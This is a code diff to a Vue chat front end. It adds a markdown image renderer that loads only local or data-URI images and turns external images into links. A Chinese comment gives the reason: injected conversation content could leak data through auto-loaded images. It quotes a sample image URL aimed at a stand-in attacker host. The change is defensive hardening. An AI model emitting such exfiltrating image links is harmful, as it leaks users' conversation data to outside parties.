@@ -88,6 +88,20 @@ const agentReady = computed(() => !!localStorage.getItem('kb_agent_endpoint'))
 // 刻意不接 prism 高亮：桌面版那套 prism 语言组件有「全局 Prism 求值顺序」的坑，
 // 移动端没必要为代码高亮付出这个复杂度和体积。
 const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
+// 外部图片不自动加载：markdown 的 ![](https://attacker/log?d=...) 会被浏览器自动请求，
+// 被注入的对话内容可能借此外泄（外部复审 2026-10-07）。只放行本站 /uploads /emojis，
+// 其余降级为纯文本链接（点击才会访问）。
+const LOCAL_IMG_RE = /^\/(uploads|emojis)\//i
+const defaultRenderImage = md.renderer.rules.image
+md.renderer.rules.image = (tokens, idx, opts, env, self) => {
+  const src = tokens[idx].attrGet('src') || ''
+  if (LOCAL_IMG_RE.test(src) || /^(data:image\/(png|jpe?g|gif|webp|bmp);base64,)/i.test(src)) {
+    return defaultRenderImage(tokens, idx, opts, env, self)
+  }
+  const href = md.utils.escapeHtml(src)
+  return '<a href="' + href + '" target="_blank" rel="noopener noreferrer">[外部图片，点击查看]</a>'
+}
+
 function renderMarkdown(src) {
   try {
     return md.render(String(src || ''))
